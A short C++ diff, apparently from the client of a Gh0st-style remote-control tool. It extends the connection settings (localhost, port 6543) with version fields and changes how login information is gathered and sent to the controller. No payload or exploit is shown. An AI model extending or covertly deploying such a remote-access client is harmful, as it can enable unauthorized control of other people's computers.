@@ -11,7 +11,7 @@
 #define CLIENT_PARALLEL_NUM 1
 
 // 远程地址
-CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "127.0.0.1", "6543", CLIENT_TYPE_DLL};
+CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION};
 
 // 最终客户端只有2个全局变量: g_SETTINGS、g_MyApp，而g_SETTINGS作为g_MyApp的成员.
 // 因此全局来看只有一个全局变量: g_MyApp
@@ -493,7 +493,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
 		Manager = new CKernelManager(&settings, ClientObject, app.g_hInstance);
 
 		//准备第一波数据
-		LOGIN_INFOR login = GetLoginInfo(GetTickCount64() - dwTickCount, settings.ClientType());
+		LOGIN_INFOR login = GetLoginInfo(GetTickCount64() - dwTickCount, settings);
 		ClientObject->SendLoginInfo(login);
 
 		do 
